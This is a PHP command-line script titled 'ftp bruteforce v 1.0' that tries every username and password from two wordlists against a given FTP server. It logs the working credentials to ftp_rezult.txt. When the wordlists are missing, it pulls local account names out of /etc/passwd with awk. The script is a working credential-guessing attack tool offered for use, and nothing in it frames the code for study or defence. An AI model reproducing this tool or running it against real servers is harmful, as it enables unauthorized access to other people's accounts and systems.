<?php

error_reporting(0);
//awk -F":" '{ print $1 }' /etc/passwd



$art =  "
\033[1;31m###################################################
\033[1;32m#https://www.facebook.com/Officiel.mhmad          #
\033[1;33m#                                                 #
\033[1;34m# ░░░░░░███████ ]▄▄▄▄▄▄▄▄                         #
\033[1;35m#▂▄▅█████████▅▄▃▂                                 #
\033[1;36m#I███████████████████].                           #
\033[1;33m#◥⊙▲⊙▲⊙▲⊙▲⊙▲⊙▲⊙◤...                               #
\033[1;34m#                                                 #
\033[1;36m#               ftp bruteforce v 1.0              #
\033[1;32m#                                                 #
\033[1;31m#               Coded By w0lgix                   # 
\033[1;34m###################################################\033[1;m\n
";


$ftp_server = $argv[1]; 
$ftp_user_name = $argv[2]; 
$ftp_user_pass = $argv[3];

if(!is_file($ftp_user_name) || !is_file($ftp_user_pass)){

	system('clear');

	$path = getcwd();
	system("awk -F':' '{ print $1 }' /etc/passwd > $path/users.txt");
	echo $art;
	echo "Example: <localhost> <users.txt> <pwd.txt>\n";
	die();
}


echo $art;



$open = fopen($ftp_user_name, 'r');
$read = fread($open, filesize($ftp_user_name));
fclose($open);

$ftp_user_name1 = explode("\n", $read);
	
foreach ($ftp_user_name1 as $users) {
 
$open1 = fopen($ftp_user_pass, 'r');
$read1 = fread($open1, filesize($ftp_user_pass));
fclose($open1);
$ftp_user_pass1 = explode("\n", $read1);

foreach ($ftp_user_pass1 as $key) {
	
// login with username and password  
$conn_id = ftp_connect($ftp_server); 

$login_result = ftp_login($conn_id, $users, $key); 
// check connection 
if ($login_result) {  

        $open3 = fopen("ftp_rezult.txt", "a+");
		$read3 = fwrite($open3, "$ftp_server >> $users $key\n");
		fclose($open3);
        echo "\033[1;33m$users \t $key\n\033[1;m"; 

	} 
else 
	{ 
		
        echo "FTP connection has failed!\n";
        
    } 

	   }
		  }
			
?>
